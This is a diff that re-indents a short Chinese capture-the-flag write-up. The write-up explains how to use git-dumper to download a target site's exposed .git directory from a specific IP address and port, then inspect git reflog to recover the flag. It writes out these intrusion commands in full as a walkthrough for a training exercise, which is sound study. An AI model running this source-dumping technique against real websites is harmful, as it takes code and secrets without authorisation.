@@ -24,17 +24,17 @@ This is my friend :
 
 1. 安装 git-dumper（我是在 pycharm 里装的，也可以在终端执行下面这条）
 
-`pip install git-dumper`
+    `pip install git-dumper`
 
 2. 把目标网站的 .git 目录扒下来
 
-`git-dumper http://160.202.254.160:12070/.git/ ./source_code`
+    `git-dumper http://160.202.254.160:12070/.git/ ./source_code`
 
 3. 进入新建的 source_code 文件夹，查看 git 操作记录
 
-`cd source_code`
+    `cd source_code`
 
-`git reflog`
+    `git reflog`
 
 4. 找到嫌疑哈希值，还原出flag。
 5. 尝试直到找到正确flag
